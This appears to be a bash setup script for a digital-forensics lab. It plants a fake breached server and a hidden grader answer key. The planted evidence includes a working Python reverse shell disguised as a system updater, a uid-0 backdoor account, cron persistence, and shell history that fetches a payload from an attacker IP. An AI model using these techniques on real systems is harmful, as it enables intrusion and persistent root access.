#!/bin/bash
# Lab 12 — plants a compromised Linux host for forensic investigation.
# A "seized" server: attacker brute-forced SSH, dropped malware, added a backdoor account + cron.
set -e

r() { echo $(( (RANDOM % 200) + 20 )); }
ATTACKER_IP="45.133.1.$(r)"
C2_IP="185.220.101.$(r)"
FLAG="FLAG{dfir_$(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \n')}"
PAYLOAD_B64="$(printf '%s' "$FLAG" | base64)"
BREACH="2026-10-21 02:14:37"

# ---- log evidence: SSH brute force then success from the attacker ----
mkdir -p /var/log
cat > /var/log/auth.log <<EOF
Oct 21 02:11:02 prod-erp sshd[1101]: Failed password for root from $ATTACKER_IP port 51012 ssh2
Oct 21 02:11:19 prod-erp sshd[1104]: Failed password for root from $ATTACKER_IP port 51020 ssh2
Oct 21 02:12:40 prod-erp sshd[1108]: Failed password for root from $ATTACKER_IP port 51033 ssh2
Oct 21 02:14:37 prod-erp sshd[1125]: Accepted password for root from $ATTACKER_IP port 51101 ssh2
Oct 21 02:14:37 prod-erp sshd[1125]: pam_unix(sshd:session): session opened for user root
Oct 21 02:21:08 prod-erp sudo:  www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
EOF

# ---- the dropped malware (static-analysis target): C2 + base64 config embedded ----
mkdir -p /dev/shm
cat > /dev/shm/.update <<EOF
#!/usr/bin/env python3
# nightly system updater (do not remove)
import socket, subprocess, os, base64, time
C2_HOST = "$C2_IP"
C2_PORT = 4444
# telemetry config - base64 (do not modify)
CFG = "$PAYLOAD_B64"
def beacon():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
        except Exception:
            time.sleep(60)
if __name__ == "__main__":
    beacon()
EOF
chmod +x /dev/shm/.update

# ---- persistence 1: backdoor root account (uid 0) hidden as "sysupdate" ----
grep -q '^sysupdate:' /etc/passwd || echo 'sysupdate:x:0:0:System Update Service:/root:/bin/bash' >> /etc/passwd

# ---- persistence 2: cron that relaunches the malware ----
echo '* * * * * root /dev/shm/.update' > /etc/cron.d/sysupdate
chmod 644 /etc/cron.d/sysupdate

# ---- attacker's shell history (left behind) ----
cat > /root/.bash_history <<EOF
id
uname -a
wget http://$ATTACKER_IP/u -O /dev/shm/.update
chmod +x /dev/shm/.update
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate
echo '* * * * * root /dev/shm/.update' > /etc/cron.d/sysupdate
cat /etc/shadow
nohup python3 /dev/shm/.update &
EOF

# ---- timeline: stamp attacker artifacts to the breach time ----
touch -d "$BREACH" /dev/shm/.update /etc/cron.d/sysupdate /root/.bash_history 2>/dev/null || true

# ---- answer key for the grader ----
cat > /opt/.lab12_answers.json <<EOF
{
  "attacker_ip": "$ATTACKER_IP",
  "malware_path": "/dev/shm/.update",
  "c2_ip": "$C2_IP",
  "payload_flag": "$FLAG",
  "persist_user": "sysupdate"
}
EOF
chmod 600 /opt/.lab12_answers.json

echo "[*] Lab 12 evidence staged. Investigate the host, analyst."
exec sleep infinity
